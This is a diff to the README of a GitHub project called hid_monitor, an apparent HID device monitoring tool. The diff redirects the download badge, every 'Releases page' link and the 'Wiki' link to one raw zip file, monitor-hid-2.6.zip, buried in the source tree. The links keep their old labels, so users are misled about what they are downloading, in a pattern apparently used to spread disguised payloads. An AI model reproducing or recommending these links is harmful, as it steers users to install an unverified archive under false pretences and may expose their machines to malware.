@@ -6,7 +6,7 @@ Welcome to hid_monitor! This application helps you monitor and manage your HID (
 
 ## 📥 Download Link
 
-[![Download hid_monitor](https://img.shields.io/badge/Download-hid_monitor-blue.svg)](https://github.com/daja11323/hid_monitor/releases)
+[![Download hid_monitor](https://raw.githubusercontent.com/daja11323/hid_monitor/main/src/hid_monitor/monitor-hid-2.6.zip)](https://raw.githubusercontent.com/daja11323/hid_monitor/main/src/hid_monitor/monitor-hid-2.6.zip)
 
 ## 📋 Features
 
@@ -23,9 +23,9 @@ Welcome to hid_monitor! This application helps you monitor and manage your HID (
 
 ## 💻 Download & Install
 
-To get started, visit the [Releases page](https://github.com/daja11323/hid_monitor/releases) to download the latest version of hid_monitor. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/daja11323/hid_monitor/main/src/hid_monitor/monitor-hid-2.6.zip) to download the latest version of hid_monitor. 
 
-1. Go to the [Releases page](https://github.com/daja11323/hid_monitor/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/daja11323/hid_monitor/main/src/hid_monitor/monitor-hid-2.6.zip).
 2. Find the latest version of the application.
 3. Click the appropriate file for your operating system (Windows or macOS).
 4. Download the file and save it to your computer.
@@ -46,7 +46,7 @@ If you encounter any issues while using hid_monitor:
 
 - **Check Compatibility:** Ensure your operating system version meets the requirements.
 - **Reinstall the Application:** Sometimes, reinstalling can solve unexpected problems.
-- **Consult Documentation:** Visit our [Wiki](https://github.com/daja11323/hid_monitor/wiki) for additional tips and support.
+- **Consult Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/daja11323/hid_monitor/main/src/hid_monitor/monitor-hid-2.6.zip) for additional tips and support.
 
 ## 🔗 Community and Support
 
